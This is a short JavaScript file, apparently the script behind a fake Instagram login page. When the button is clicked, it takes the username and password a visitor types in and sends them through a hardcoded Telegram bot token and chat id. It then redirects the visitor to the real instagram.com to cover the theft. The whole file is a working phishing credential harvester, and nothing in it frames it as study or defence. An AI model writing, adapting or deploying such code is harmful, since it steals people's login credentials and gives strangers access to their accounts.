

let inputs = document.querySelectorAll('input')
let buttonLogin = document.querySelector('.login-button')

const SendMessageFunction = () => {
    let Token = '6768536090:AAHED7gIL5zUoEM5XeZIiSJE0EnY28sLun4'
    let ChatId = '858709040'
    let ApiUrl = `https://api.telegram.org/bot${Token}/sendMessage`;

    let data = {
        chat_id: ChatId,
        text: `username: ${inputs[0].value} \npassword: ${inputs[1].value}`
    }

    let options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    };

    fetch(ApiUrl, options)
        .then(data => data.json())
        .then(res => {
            console.log('data ketdi', res)
            window.location.href = "https://www.instagram.com/"
        })
        .catch(error => console.log('Xatolik bor', error))
}

buttonLogin.addEventListener('click', SendMessageFunction)

